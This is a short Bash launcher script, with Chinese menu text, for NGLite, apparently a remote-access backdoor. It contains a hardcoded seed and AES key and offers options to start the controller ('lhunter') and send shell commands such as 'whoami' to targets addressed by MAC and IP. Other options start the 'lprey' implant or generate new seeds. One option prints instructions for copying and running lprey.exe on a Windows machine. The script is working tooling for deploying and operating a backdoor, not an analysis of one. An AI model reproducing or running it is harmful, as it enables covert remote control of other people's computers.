#!/bin/bash

SEED="80cefff57f98ea12e7907d159e3d3b072a29a42657f94a35e4a35b53f79e54dd"

echo "==================================="
echo "NGLite 自定义 Seed 快速启动脚本"
echo "==================================="
echo ""
echo "当前使用的 Seed:"
echo "$SEED"
echo ""
echo "请选择操作："
echo "1) 启动 GUI 控制端（推荐）"
echo "2) 启动 CLI 控制端"
echo "3) 启动 macOS 被控端（测试用）"
echo "4) 生成新的 Seed"
echo "5) 显示 Windows 被控端启动命令"
echo "0) 退出"
echo ""
read -p "请输入选项 [0-5]: " choice

case $choice in
    1)
        echo ""
        echo "创建配置文件..."
        cat > /tmp/nglite-config.json << EOF
{
  "seed_id": "$SEED",
  "hunter_id": "monitor",
  "aes_key": "whatswrongwithUu",
  "trans_threads": 4
}
EOF
        echo "启动 GUI 控制端..."
        ./bin/lhunter-gui -c /tmp/nglite-config.json
        ;;
    2)
        echo ""
        echo "启动 CLI 控制端..."
        echo "提示：输入 '<MAC><IP> <命令>' 来发送命令"
        echo "例如：00:15:5d:12:34:56192.168.1.100 whoami"
        echo ""
        ./bin/lhunter-cli -g "$SEED"
        ;;
    3)
        echo ""
        echo "启动 macOS 被控端（用于本地测试）..."
        ./bin/lprey -g "$SEED"
        ;;
    4)
        echo ""
        echo "生成新的 Seed..."
        NEW_SEED=$(./bin/lhunter-cli -n new)
        echo ""
        echo "新生成的 Seed:"
        echo "$NEW_SEED"
        echo ""
        echo "如需使用新 Seed，请修改本脚本第 3 行的 SEED 变量"
        echo "或手动使用: ./bin/lhunter-cli -g $NEW_SEED"
        ;;
    5)
        echo ""
        echo "==================================="
        echo "Windows 被控端启动命令"
        echo "==================================="
        echo ""
        echo "1. 将 bin/lprey.exe 复制到 Windows 机器"
        echo ""
        echo "2. 在 Windows 上执行："
        echo ""
        echo "   lprey.exe -g $SEED"
        echo ""
        echo "3. 或者复制以下完整命令："
        echo ""
        echo "lprey.exe -g $SEED"
        echo ""
        ;;
    0)
        echo "退出"
        exit 0
        ;;
    *)
        echo "无效选项"
        exit 1
        ;;
esac

